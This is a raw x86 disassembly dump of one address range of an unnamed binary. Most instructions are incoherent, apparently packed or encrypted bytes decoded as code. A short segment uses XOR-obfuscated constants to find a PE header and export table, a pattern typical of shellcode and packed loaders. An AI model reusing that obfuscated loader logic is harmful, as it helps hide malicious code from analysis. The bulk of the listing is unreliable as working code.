  4196bd:	jae    0x419693
  4196bf:	outs   dx,DWORD PTR ds:[esi]
  4196c0:	out    dx,al
  4196c1:	ret    0x9434
  4196c4:	pop    ecx
  4196c5:	cs retf 
  4196c7:	data16 fdivr DWORD PTR [ebp-0x2c]
  4196cb:	mov    dl,0xcc
  4196cd:	clc    
  4196ce:	sub    ebx,DWORD PTR [edx-0x7db5837f]
  4196d4:	loope  0x419749
  4196d6:	(bad)  [ebx-0x498799e2]
  4196dc:	sub    bh,BYTE PTR [ebp+0x6618329c]
  4196e2:	jle    0x419715
  4196e4:	sbb    DWORD PTR ds:0x1d5aa469,ebx
  4196ea:	and    DWORD PTR [edi+0x380c1ce1],ebx
  4196f0:	cli    
  4196f1:	sbb    ecx,DWORD PTR [ebp+0x34]
  4196f4:	pop    esi
  4196f5:	xchg   ebx,eax
  4196f6:	push   es
  4196f7:	mov    ds:0x62811ef,eax
  4196fc:	sub    dl,dl
  4196fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196ff:	xchg   esi,eax
  419700:	sar    BYTE PTR [ebx],0xb2
  419703:	retf   
  419704:	xor    BYTE PTR [edx+eax*1-0x11],0x64
  419709:	mov    al,ds:0xa01ae488
  41970e:	cmp    ah,BYTE PTR [edi-0x60]
  419711:	iret   
  419712:	mov    ds:0x20324c55,eax
  419717:	adc    DWORD PTR [ebp-0x4b],ebx
  41971a:	and    eax,0x5690371e
  41971f:	mov    al,ds:0x7e627957
  419724:	push   0x9a6b2b22
  419729:	mov    eax,ds:0x7886a52e
  41972e:	and    ebx,DWORD PTR [eax+0x28e1e711]
  419734:	scas   al,BYTE PTR es:[edi]
  419735:	adc    eax,0x6ddaa478
  41973a:	into   
  41973b:	test   BYTE PTR [esi+0x8],ah
  41973e:	adc    edx,DWORD PTR [eax-0x7c]
  419741:	adc    eax,0xa1a327b3
  419746:	mov    al,dh
  419748:	pop    eax
  419749:	cwde   
  41974a:	cmp    bh,bl
  41974c:	out    0x89,eax
  41974e:	cdq    
  41974f:	fwait
  419750:	neg    DWORD PTR [edx+0x4e005c3]
  419756:	and    al,0x6a
  419758:	adc    edi,DWORD PTR [edx]
  41975a:	lahf   
  41975b:	mov    cs,WORD PTR ds:0x218cad7c
  419761:	sub    ecx,DWORD PTR [esi-0x4c394f38]
  419767:	jns    0x419767
  419769:	sub    esp,esi
  41976b:	es jle 0x4197b0
  41976e:	xor    DWORD PTR [ecx-0x4d8d8b97],edi
  419774:	push   edi
  419775:	sbb    DWORD PTR [ecx+0xa],edi
  419778:	jge    0x4197bb
  41977a:	and    ch,ah
  41977c:	mov    al,0x52
  41977e:	pop    ss
  41977f:	mov    dl,0x1d
  419781:	or     BYTE PTR ds:[ecx+eiz*8+0x6],dh
  419786:	fbld   TBYTE PTR [eax-0x7633a778]
  41978c:	mov    ds:0x683d1ce7,al
  419791:	sbb    eax,DWORD PTR [ebx]
  419793:	jmp    0x65527d4c
  419798:	xor    BYTE PTR [ebx-0x5a040de1],dl
  41979e:	fidiv  WORD PTR [ecx+0x25]
  4197a1:	or     al,0x1b
  4197a3:	lods   eax,DWORD PTR ds:[esi]
  4197a4:	imul   ebp,DWORD PTR [esi+eiz*8],0x79c00ecb
  4197ab:	pop    es
  4197ac:	fadd   QWORD PTR [edi-0x54]
  4197af:	in     eax,0x8b
  4197b1:	xor    ah,dh
  4197b3:	mov    ch,0x85
  4197b5:	fisttp DWORD PTR [ecx-0x36]
  4197b8:	cmp    BYTE PTR [ecx],0xef
  4197bb:	repnz sbb al,0x4e
  4197be:	pop    ds
  4197bf:	pop    ss
  4197c0:	inc    edi
  4197c1:	cmp    al,0xb7
  4197c3:	jae    0x4197b2
  4197c5:	sbb    eax,0x93c9172b
  4197ca:	add    eax,0x8f8f5b2f
  4197cf:	das    
  4197d0:	nop
  4197d1:	sbb    al,0xc3
  4197d3:	mov    DWORD PTR [esi-0x26],eax
  4197d6:	mov    bh,BYTE PTR [eax-0x10e01dd7]
  4197dc:	add    bh,BYTE PTR [ebp+0x51dac0e5]
  4197e2:	(bad)  
  4197e3:	mov    ebx,0x3762f9d8
  4197e8:	xor    BYTE PTR [ebx-0x58a74082],al
  4197ee:	ins    BYTE PTR es:[edi],dx
  4197ef:	mov    cl,0xef
  4197f1:	loope  0x4197e2
  4197f3:	jns    0x4197f2
  4197f5:	leave  
  4197f6:	neg    BYTE PTR [edx-0x2b]
  4197f9:	mov    BYTE PTR [edx+0x76239822],bl
  4197ff:	les    esp,FWORD PTR [edx+eax*8]
  419802:	(bad)  
  419803:	xor    al,0xfb
  419805:	retf   0x9e80
  419808:	aas    
  419809:	jmp    0x4197af
  41980b:	rcr    BYTE PTR [edi-0x61],1
  41980e:	xchg   BYTE PTR [ecx+0x2b921e66],dh
  419814:	push   esi
  419815:	retf   
  419816:	jmp    0x8f32b8a1
  41981b:	pusha  
  41981c:	shl    BYTE PTR [ebx+0x42d232e1],cl
  419822:	jae    0x41981e
  419824:	stc    
  419825:	test   DWORD PTR [eax],0xce58ac11
  41982b:	pop    edx
  41982c:	je     0x419806
  41982e:	aaa    
  41982f:	cmc    
  419830:	les    esp,FWORD PTR [eax+0x37b75ebf]
  419836:	test   BYTE PTR [ecx],ch
  419838:	ss pop ebx
  41983a:	push   ds
  41983b:	inc    eax
  41983c:	pushf  
  41983d:	(bad)  
  41983e:	aam    0x85
  419840:	popa   
  419841:	push   ss
  419842:	xlat   BYTE PTR ds:[ebx]
  419843:	out    dx,al
  419844:	stos   DWORD PTR es:[edi],eax
  419845:	(bad)  
  419846:	fwait
  419847:	shl    BYTE PTR [edi],0xa
  41984a:	popf   
  41984b:	dec    ecx
  41984c:	and    BYTE PTR [ecx-0x4ac4da24],0xef
  419853:	lock dec ebx
  419855:	adc    DWORD PTR [esi],ebx
  419857:	js     0x419827
  419859:	pop    ds
  41985a:	xchg   DWORD PTR [edx+0x1a],ebp
  41985d:	sbb    ah,BYTE PTR [ebx+0x4e6ea6da]
  419863:	push   edx
  419864:	je     0x4198a5
  419866:	mov    BYTE PTR ds:0xc3772a65,ah
  41986c:	and    DWORD PTR [edi+0x74],0xfae69ace
  419873:	add    eax,0x932a07ee
  419878:	int    0xb
  41987a:	jne    0x419801
  41987c:	test   BYTE PTR [edi],dl
  41987e:	icebp  
  41987f:	add    al,ch
  419881:	sub    BYTE PTR [ebx+0x1d],cl
  419884:	pop    es
  419885:	xchg   BYTE PTR [esi+0x5d],ah
  419888:	cwde   
  419889:	push   esi
  41988a:	hlt    
  41988b:	inc    BYTE PTR [esi]
  41988d:	sbb    eax,0x7281e5f3
  419892:	or     DWORD PTR [ecx],esp
  419894:	andnps xmm0,xmm6
  419897:	jne    0x4198fc
  419899:	retf   0x964e
  41989c:	mov    ah,0x31
  41989e:	pop    es
  41989f:	and    BYTE PTR ds:0xd5747350,0x8d
  4198a6:	nop
  4198a7:	jecxz  0x41991a
  4198a9:	stc    
  4198aa:	pop    ebx
  4198ab:	mov    ch,0x9
  4198ad:	xchg   ebx,eax
  4198ae:	bound  eax,QWORD PTR [edx+edx*4-0x77]
  4198b2:	xlat   BYTE PTR ds:[ebx]
  4198b3:	bound  ebp,QWORD PTR [edi]
  4198b5:	mov    eax,ds:0x2a0910e9
  4198ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198bb:	mov    eax,ds:0x665c39a5
  4198c0:	aaa    
  4198c1:	shl    DWORD PTR [esi+0x12],cl
  4198c4:	xor    bl,BYTE PTR [eax+0x4d]
  4198c7:	je     0x4198d4
  4198c9:	push   ebx
  4198ca:	or     eax,0x8b16cbe8
  4198cf:	mov    edx,0x5e76f10f
  4198d4:	test   BYTE PTR [eax-0xd],dl
  4198d7:	(bad)  
  4198d9:	and    al,0x38
  4198db:	loopne 0x4198dd
  4198dd:	jno    0x41990c
  4198df:	lahf   
  4198e0:	stos   DWORD PTR es:[edi],eax
  4198e1:	or     al,0x1c
  4198e3:	loop   0x419897
  4198e5:	lds    esp,FWORD PTR [ebx-0x71e2bf7e]
  4198eb:	pop    edx
  4198ec:	jle    0x4198ec
  4198ee:	fbstp  TBYTE PTR [esi-0x1e4a2218]
  4198f4:	imul   ebp,esi,0x577d8b6b
  4198fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198fb:	pop    DWORD PTR [ebp+0x12e512ee]
  419901:	mov    esp,0x6d6dd30
  419906:	ror    DWORD PTR [ebx-0xb],0x20
  41990a:	outs   dx,BYTE PTR ds:[esi]
  41990b:	enter  0xaa62,0x8e
  41990f:	int3   
  419910:	lods   eax,DWORD PTR ds:[esi]
  419911:	call   0xf5806aef
  419916:	push   edi
  419917:	sbb    eax,0xd65d52d2
  41991c:	rcl    BYTE PTR [eax+0x30],cl
  41991f:	dec    edi
  419920:	adc    al,0xf
  419922:	jmp    0x77e6:0x17942cb5
  419929:	aaa    
  41992a:	loopne 0x41995f
  41992c:	(bad)  
  41992d:	fsub   st(3),st
  41992f:	push   ebx
  419930:	retf   
  419931:	in     al,dx
  419932:	arpl   WORD PTR [eax+0x7139a929],sp
  419938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419939:	mov    edi,0x518cee8e
  41993e:	fcom   QWORD PTR [edi-0x7aeff843]
  419944:	push   ss
  419945:	or     al,0xcf
  419947:	retf   0x9b2e
  41994a:	test   eax,0xbe12f428
  41994f:	xchg   esp,eax
  419950:	js     0x41992e
  419952:	(bad)  
  419954:	lea    sp,[ecx+0x445bcc43]
  41995b:	jg     0x41995c
  41995d:	mov    esi,0xe76489e5
  419962:	cmp    BYTE PTR [edi+edi*8-0x5201ccf8],cl
  419969:	lea    edi,[edx+0x61918363]
  41996f:	popa   
  419970:	adc    eax,0x31820992
  419975:	hlt    
  419976:	and    eax,0xe0c422fc
  41997b:	popa   
  41997c:	fs dec ebp
  41997e:	and    ebp,DWORD PTR [edx-0x7c]
  419981:	cmp    DWORD PTR [ebx+esi*1-0x5],esi
  419985:	stc    
  419986:	pop    es
  419987:	cli    
  419988:	mov    eax,0x19f51b19
  41998d:	fdiv   DWORD PTR [edi]
  41998f:	movups xmm5,xmm3
  419992:	push   ebx
  419993:	dec    edx
  419994:	ret    0xe12a
  419997:	loope  0x419931
  419999:	pusha  
  41999a:	test   DWORD PTR [edi],ebp
  41999c:	cmp    al,0x21
  41999e:	add    eax,0x2d460807
  4199a3:	mov    bh,0x4c
  4199a5:	ins    DWORD PTR es:[edi],dx
  4199a6:	or     al,0x10
  4199a8:	fstp   TBYTE PTR fs:[ebx+0x6b4e4c09]
  4199af:	cdq    
  4199b0:	inc    ebx
  4199b1:	fbstp  TBYTE PTR [eax]
  4199b3:	push   ss
  4199b4:	sbb    al,0x7f
  4199b6:	sbb    al,0x0
  4199b8:	sub    DWORD PTR [ecx+ebx*8-0x72492e4a],edi
  4199bf:	and    esi,DWORD PTR [eax+eax*8-0x558a407e]
  4199c6:	inc    DWORD PTR [edi-0x2f]
  4199c9:	mov    dl,0x16
  4199cb:	push   esp
  4199cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199cd:	sub    al,0x6a
  4199cf:	push   es
  4199d0:	cdq    
  4199d1:	xchg   DWORD PTR [edx+ebx*1+0xd],esp
  4199d5:	mov    bl,0xb5
  4199d7:	pop    ebp
  4199d8:	fcomp  DWORD PTR [edi-0x7d]
  4199db:	rcr    BYTE PTR [ebx],cl
  4199dd:	test   DWORD PTR [ebp-0xd],edx
  4199e0:	and    ch,ah
  4199e2:	into   
  4199e3:	jnp    0x419991
  4199e5:	inc    ebx
  4199e6:	inc    ebp
  4199e7:	test   ah,cl
  4199e9:	out    0x2d,eax
  4199eb:	push   eax
  4199ec:	test   eax,0x2d9d52bd
  4199f1:	dec    ebp
  4199f2:	mov    ?,WORD PTR ds:0xb2ddf83
  4199f8:	xchg   esp,eax
  4199f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199fa:	xchg   ecx,eax
  4199fb:	repnz fwait
  4199fd:	mov    edx,0xee8337c5
  419a02:	xor    dl,cl
  419a04:	jbe    0x4199db
  419a06:	mov    ?,WORD PTR [bp+0x37]
  419a0a:	sub    DWORD PTR ds:0x12d21523,ebp
  419a10:	adc    al,0x3b
  419a12:	jb     0x419a52
  419a14:	or     al,BYTE PTR [ecx-0xe]
  419a17:	cmovbe esi,DWORD PTR [esi]
  419a1a:	sub    DWORD PTR [ebp-0x2c],edi
  419a1d:	inc    eax
  419a1e:	ror    BYTE PTR [edx+esi*8+0x14],cl
  419a22:	cmp    al,0xa3
  419a24:	jne    0x4199ad
  419a26:	mov    cl,dl
  419a28:	pusha  
  419a29:	loopne 0x419a83
  419a2b:	jecxz  0x419a6d
  419a2d:	inc    ebp
  419a2e:	pop    ecx
  419a2f:	jg     0x419a12
  419a31:	out    dx,eax
  419a32:	fisttp QWORD PTR [esi+ecx*8+0x45]
  419a36:	fisubr WORD PTR [edi]
  419a38:	aas    
  419a39:	inc    ecx
  419a3a:	inc    ebp
  419a3b:	push   ebp
  419a3c:	unpckhps xmm6,XMMWORD PTR [ebx-0xf]
  419a40:	add    eax,0xa74109e
  419a45:	push   0xf5858c58
  419a4a:	mov    dl,0xb9
  419a4c:	mov    eax,0x2e1e7db2
  419a51:	ja     0x419a1d
  419a53:	xchg   ecx,eax
  419a54:	add    eax,0x72fadf0c
  419a59:	push   ebp
  419a5a:	ss int3 
  419a5c:	fcom   QWORD PTR [edx-0x61a89cf7]
  419a62:	ficom  DWORD PTR [ebx-0x79735418]
  419a68:	and    eax,0x7f41fa3c
  419a6d:	popa   
  419a6e:	dec    ecx
  419a6f:	sbb    BYTE PTR [edi],bh
  419a71:	leave  
  419a72:	mov    ebp,0x59eec9a8
  419a77:	pushf  
  419a78:	inc    esp
  419a79:	retf   0x49c6
  419a7c:	push   edx
  419a7d:	xor    eax,0xc605897d
  419a82:	clc    
  419a83:	lods   eax,DWORD PTR ds:[esi]
  419a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a85:	gs nop
  419a87:	and    DWORD PTR [edi+0x43],ebx
  419a8a:	mov    ah,0x49
  419a8c:	add    eax,0x95faf8cc
  419a91:	push   edx
  419a92:	cdq    
  419a93:	fldcw  WORD PTR ds:0x7f5346f7
  419a99:	push   edi
  419a9a:	cs or  al,0x79
  419a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a9e:	out    dx,eax
  419a9f:	sbb    DWORD PTR [ebx+edx*8-0x1ea2f321],ebp
  419aa6:	push   eax
  419aa7:	push   0x4b
  419aa9:	loop   0x419a99
  419aab:	mov    eax,0x44cde087
  419ab0:	pop    eax
  419ab1:	push   esp
  419ab2:	arpl   WORD PTR [edx],cx
  419ab4:	popa   
  419ab5:	push   ecx
  419ab6:	mov    bl,BYTE PTR [edx-0xa]
  419ab9:	mov    al,ds:0xf66c9d56
  419abe:	(bad)  
  419abf:	push   ds
  419ac0:	add    DWORD PTR [esi-0x60],0x2e6b15d0
  419ac7:	mov    eax,ds:0xf52b7220
  419acc:	daa    
  419acd:	outs   dx,BYTE PTR ds:[esi]
  419ace:	test   al,ch
  419ad0:	stos   DWORD PTR es:[edi],eax
  419ad1:	inc    ebp
  419ad2:	mov    dl,0xd6
  419ad4:	call   0xb160:0xb9667560
  419adb:	mov    dl,0xb9
  419add:	mov    ds:0xa8748175,al
  419ae2:	call   0x6cfa94fb
  419ae7:	cmc    
  419ae8:	or     bl,BYTE PTR [ecx-0x3140491f]
  419aee:	int3   
  419aef:	add    BYTE PTR [ebx],dh
  419af1:	pop    ecx
  419af2:	mov    al,ds:0x9e22f185
  419af7:	iret   
  419af8:	ret    
  419af9:	pusha  
  419afa:	or     bh,bh
  419afc:	mov    eax,0xcffdb79c
  419b01:	sub    BYTE PTR [ecx+0x22],bl
  419b04:	in     eax,dx
  419b05:	fdivr  DWORD PTR [ebx+0x19]
  419b08:	loop   0x419b61
  419b0a:	xor    DWORD PTR [edi],esi
  419b0c:	jecxz  0x419ac5
  419b0e:	xchg   BYTE PTR ds:0x99a24d6c,dh
  419b14:	cmc    
  419b15:	or     DWORD PTR [ecx+eax*8-0x31e2993],ecx
  419b1c:	(bad)  
  419b1d:	cld    
  419b1e:	sub    DWORD PTR [ebx],0xbd6bc9c7
  419b24:	arpl   WORD PTR [ecx-0x3ec26696],dx
  419b2a:	mov    ecx,0xcfbcb7c9
  419b2f:	dec    eax
  419b30:	mov    al,ds:0x3729ef42
  419b35:	push   ds
  419b36:	cli    
  419b37:	enter  0xabc6,0xce
  419b3b:	xchg   ebx,eax
  419b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b3d:	or     BYTE PTR [edi],bh
  419b3f:	sbb    BYTE PTR [ebx-0x6838346d],0x46
  419b46:	sub    al,0x4f
  419b48:	jecxz  0x419b44
  419b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b4b:	dec    edx
  419b4c:	imul   ebx,DWORD PTR [eax+0x57],0xffffffe9
  419b50:	ds jo  0x419b3e
  419b53:	pop    ebp
  419b54:	out    dx,al
  419b55:	push   ss
  419b56:	and    eax,DWORD PTR [edx]
  419b58:	and    DWORD PTR [edi+edx*1-0x72ca8808],0xaca9bf70
  419b63:	lds    eax,FWORD PTR [edx]
  419b65:	xchg   ebx,eax
  419b66:	and    eax,0x80a4a7b9
  419b6b:	cmc    
  419b6c:	and    eax,0xe72bef5f
  419b71:	outs   dx,BYTE PTR ds:[esi]
  419b72:	cwde   
  419b73:	jns    0x419bf4
  419b75:	not    BYTE PTR [edx]
  419b77:	ss cmp cl,dl
  419b7a:	jmp    0x3a123803
  419b7f:	dec    ecx
  419b80:	xchg   edi,eax
  419b81:	and    edi,DWORD PTR [esi+ebx*2]
  419b84:	pop    esi
  419b85:	inc    esi
  419b86:	pop    edx
  419b87:	mov    bh,0xf8
  419b89:	mov    bh,0xa3
  419b8b:	sbb    eax,0x9fc79509
  419b90:	jmp    0x419b91
  419b92:	sbb    BYTE PTR [ecx],ah
  419b94:	xor    DWORD PTR [esi-0x56938f81],ebp
  419b9a:	xlat   BYTE PTR ds:[ebx]
  419b9b:	cmp    esi,edx
  419b9d:	test   eax,0x2bac31ca
  419ba2:	outs   dx,BYTE PTR ds:[esi]
  419ba3:	gs rcl dl,0x3
  419ba7:	sub    BYTE PTR ds:0xd2cbddd6,dl
  419bad:	shl    BYTE PTR [esi+0x62ea31f8],cl
  419bb3:	out    dx,al
  419bb4:	sub    al,0x13
  419bb6:	inc    edi
  419bb7:	stos   DWORD PTR es:[di],eax
  419bb9:	adc    esp,DWORD PTR [ebp+0x7f]
  419bbc:	inc    eax
  419bbd:	cli    
  419bbe:	push   eax
  419bbf:	sbb    eax,0xc30cef39
  419bc4:	in     al,0x78
  419bc6:	push   0x7c
  419bc8:	(bad)  
  419bc9:	dec    ecx
  419bca:	mov    ds:0x3dff214e,eax
  419bcf:	mov    ds:0x590d7261,eax
  419bd4:	daa    
  419bd5:	inc    edi
  419bd6:	pop    esp
  419bd7:	mov    eax,ecx
  419bd9:	clc    
  419bda:	lods   eax,DWORD PTR ds:[esi]
  419bdb:	push   ebp
  419bdc:	xchg   ebx,eax
  419bdd:	es (bad) 
  419bdf:	lock fcmovnb st,st(7)
  419be2:	jne    0x419c4b
  419be4:	push   esi
  419be5:	out    dx,eax
  419be6:	gs fcmovne st,st(6)
  419be9:	popf   
  419bea:	mov    esp,0x97eea8c9
  419bef:	jl     0x419be0
  419bf1:	sub    edi,edx
  419bf3:	call   0x3375:0x5aa4437b
  419bfa:	rcr    ecx,1
  419bfc:	jle    0x419c5c
  419bfe:	sbb    cl,BYTE PTR [eiz*2+0x233cc28b]
  419c05:	cmp    ecx,ebx
  419c07:	inc    esi
  419c08:	nop
  419c09:	adc    BYTE PTR [ecx],dl
  419c0b:	gs push eax
  419c0d:	and    BYTE PTR [esi],cl
  419c0f:	add    eax,0xd1f85478
  419c14:	cmp    BYTE PTR ds:0x808b3eee,0x19
  419c1b:	retf   0x8d0b
  419c1e:	fidiv  WORD PTR [ebx+0x69]
  419c21:	sbb    al,0xf9
  419c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c24:	ds (bad) 
  419c26:	stc    
  419c27:	xchg   DWORD PTR [ecx+0x51219e59],edi
  419c2d:	idiv   DWORD PTR [edi+0x2b]
  419c30:	add    ch,0xed
  419c33:	outs   dx,BYTE PTR ds:[esi]
  419c34:	cmp    esi,DWORD PTR [ebx-0x24]
  419c37:	fisub  WORD PTR [ebp+esi*1-0x23]
  419c3b:	call   0x51af5934
  419c40:	aam    0x57
  419c42:	jmp    0x419be9
  419c44:	mov    bl,0x8
  419c46:	fwait
  419c47:	xor    DWORD PTR ds:[ebx+esi*2-0x2c1fe016],eax
  419c4f:	(bad)  
  419c50:	jp     0x419c25
  419c52:	leave  
  419c53:	das    
  419c54:	xchg   ebx,eax
  419c55:	adc    al,0x6
  419c57:	xchg   esp,eax
  419c58:	(bad)  
  419c59:	mov    dh,0x2c
  419c5b:	mov    ds:0x6121f016,al
  419c60:	std    
  419c61:	inc    edi
  419c62:	lds    edi,FWORD PTR [edx-0x2ef20a7e]
  419c68:	mov    edx,0x1ba610c0
  419c6d:	pop    edi
  419c6e:	xchg   edi,eax
  419c6f:	xor    eax,0xb5373d69
  419c74:	out    dx,eax
  419c75:	pushf  
  419c76:	lods   al,BYTE PTR ds:[esi]
  419c77:	add    al,0xd8
  419c79:	and    BYTE PTR [edx-0x1737eb94],dh
  419c7f:	ins    BYTE PTR es:[edi],dx
  419c80:	sbb    ecx,DWORD PTR [ebx+0x35dcb6d5]
  419c86:	not    edx
  419c88:	sub    ah,cl
  419c8a:	pop    esi
  419c8b:	sbb    BYTE PTR [eax+0x6d9cb8f7],0x50
  419c92:	retf   0x86e7
  419c95:	push   edx
  419c96:	loopne 0x419c88
  419c98:	mov    bh,0x80
  419c9a:	push   ebp
  419c9b:	inc    eax
  419c9c:	enter  0x9ca2,0x97
  419ca0:	(bad)  
  419ca2:	pop    esp
  419ca3:	mov    al,0x15
  419ca5:	and    edx,DWORD PTR ds:0xcf4b701f
  419cab:	std    
  419cac:	(bad)  
  419cad:	dec    ebx
  419cae:	test   DWORD PTR [edi-0x12f7c6f5],0x2aa791a
  419cb8:	in     al,0x25
  419cba:	daa    
  419cbb:	mov    ebp,0x5496a807
  419cc0:	sbb    BYTE PTR [ebx-0x62],ch
  419cc3:	adc    al,0xea
  419cc5:	mov    ds:0x7843d953,eax
  419cca:	ins    BYTE PTR es:[edi],dx
  419ccb:	xor    esi,DWORD PTR [esi+0x5b953334]
  419cd1:	std    
  419cd2:	pop    ds
  419cd3:	dec    eax
  419cd4:	push   ebp
  419cd5:	mov    edi,0x2d0c8d6b
  419cda:	xchg   edx,eax
  419cdb:	mov    esp,0xf3a2ae3a
  419ce0:	jb     0x419cb7
  419ce2:	mov    dh,0xab
  419ce4:	(bad)  
  419ce5:	imul   ebx,DWORD PTR [esp+ecx*2],0xffffffc9
  419ce9:	lea    edi,[ebx+ebx*8-0x7427a275]
  419cf0:	jge    0x419cce
  419cf2:	and    eax,esi
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	jo     0x419d7a
  419d85:	mov    eax,ds:0x7addf552
  419d8a:	jnp    0x419d74
  419d8c:	pushf  
  419d8d:	jnp    0x419e0a
  419d8f:	into   
  419d90:	push   edx
  419d91:	xchg   edi,eax
  419d92:	sar    dh,0x78
  419d95:	mov    edx,0xf854d781
  419d9a:	push   es
  419d9b:	sub    al,0xb2
  419d9d:	jno    0x419d37
  419d9f:	dec    esp
  419da0:	loope  0x419d36
  419da2:	sub    eax,0x11cf51a8
  419da7:	sub    esi,edx
  419da9:	mov    BYTE PTR [ecx+0xeefc1fd],bh
  419daf:	scas   al,BYTE PTR es:[edi]
  419db0:	and    eax,0x68
  419db3:	xchg   ebp,eax
  419db4:	lods   eax,DWORD PTR ds:[esi]
  419db5:	mov    BYTE PTR [ebx],dl
  419db7:	jg     0x419dff
  419db9:	or     sp,WORD PTR [eax-0x4e]
  419dbd:	mov    dl,al
  419dbf:	or     bl,dl
  419dc1:	mov    cl,0x69
  419dc3:	cdq    
  419dc4:	xor    DWORD PTR ds:0xd4e92250,ebp
  419dca:	pop    edi
  419dcb:	mov    eax,0x2f5c16ce
  419dd0:	fisttp WORD PTR [esi]
  419dd2:	dec    edx
  419dd3:	mov    eax,0x4cc75fbc
  419dd8:	mov    WORD PTR [esi+ebp*4],gs
  419ddb:	fisttp DWORD PTR [edi-0x2e2aa6b1]
  419de1:	mov    bh,0xb9
  419de3:	add    ecx,DWORD PTR [ebx]
  419de5:	mov    ?,WORD PTR [eax+eiz*4-0x678980d3]
  419dec:	cmp    eax,DWORD PTR [ebp-0xec7c301]
  419df2:	cwde   
  419df3:	call   0x9bbb5d0e
  419df8:	loop   0x419da6
  419dfa:	mov    al,ah
  419dfc:	push   esi
  419dfd:	aaa    
  419dfe:	int3   
  419dff:	and    dh,BYTE PTR [esp+edi*8+0x238d3ce8]
  419e06:	mov    cl,0xec
  419e08:	jmp    0x6f053883
  419e0d:	pop    eax
  419e0e:	adc    al,0x39
  419e10:	and    eax,0x89f76dc7
  419e15:	test   edi,ebp
  419e17:	sbb    BYTE PTR [ebx+0x6b80cee1],al
  419e1d:	jno    0x419df5
  419e1f:	xor    esi,DWORD PTR [eax+0x776f8793]
  419e25:	int3   
  419e26:	loope  0x419e66
  419e28:	mov    ebp,0xb8403eda
  419e2d:	cmp    al,0x11
  419e2f:	jae    0x419e1d
  419e31:	lods   eax,DWORD PTR ds:[esi]
  419e32:	jno    0x419dcf
  419e34:	scas   al,BYTE PTR es:[edi]
  419e35:	sbb    dh,cl
  419e37:	pop    edx
  419e38:	push   esi
  419e39:	push   ecx
  419e3a:	sub    edi,eax
  419e3c:	cdq    
  419e3d:	loopne 0x419e3b
  419e3f:	loopne 0x419de3
  419e41:	sbb    dl,dl
  419e43:	xchg   dh,cl
  419e45:	fwait
  419e46:	adc    BYTE PTR [eax+0x6837e7e4],cl
  419e4c:	cs and al,0xa
  419e4f:	leave  
  419e50:	rcr    DWORD PTR [ebx-0x5f00e7b0],0x5e
  419e57:	adc    eax,0xa23a92c6
  419e5c:	adc    DWORD PTR [ebp-0x2e],ebx
  419e5f:	stos   DWORD PTR es:[edi],eax
  419e60:	pop    ss
  419e61:	or     al,0xd0
  419e63:	fnstenv [esi]
  419e65:	sbb    bl,BYTE PTR [ecx-0x58]
  419e68:	into   
  419e69:	addr16 mov bl,0x58
  419e6c:	in     al,dx
  419e6d:	jmp    0x91012b86
  419e72:	jbe    0x419ea1
  419e74:	fisubr DWORD PTR [ebx-0x55]
  419e77:	les    esp,FWORD PTR [ebx+0x71]
  419e7a:	push   0x37c88bea
  419e7f:	loopne 0x419e59
  419e81:	mov    al,0x1b
  419e83:	cmc    
  419e84:	jmp    0x27ae:0x22f74f0e
  419e8b:	stc    
  419e8c:	rcr    DWORD PTR [ebx+0x70],cl
  419e8f:	xor    cl,BYTE PTR [esi-0x6d117d52]
  419e95:	mov    bh,0xc0
  419e97:	pop    eax
  419e98:	sub    BYTE PTR [ebx+ebx*4+0x5],0xee
  419e9d:	cmc    
  419e9e:	jecxz  0x419f0b
  419ea0:	sub    ch,BYTE PTR [edx+ebp*1-0x573c6ce4]
  419ea7:	retf   0xd59e
  419eaa:	and    eax,0x44a671c0
  419eaf:	je     0x419f0f
  419eb1:	and    ebp,0x5e0a1cd2
  419eb7:	fcomi  st,st(4)
  419eb9:	call   0x3a43:0xbb486d86
  419ec0:	cmp    DWORD PTR [esi],ebx
  419ec2:	mov    ds:0xcd7f2f23,al
  419ec7:	lea    esp,[edi+0x6ae09147]
  419ecd:	fimul  WORD PTR [ebp-0x7a]
  419ed0:	lods   al,BYTE PTR ds:[esi]
  419ed1:	repnz fwait
  419ed3:	inc    esp
  419ed4:	aas    
  419ed5:	sbb    ebp,DWORD PTR [edx-0x7cd96260]
  419edb:	pop    esp
  419edc:	(bad)  
  419edd:	fsubp  st(7),st
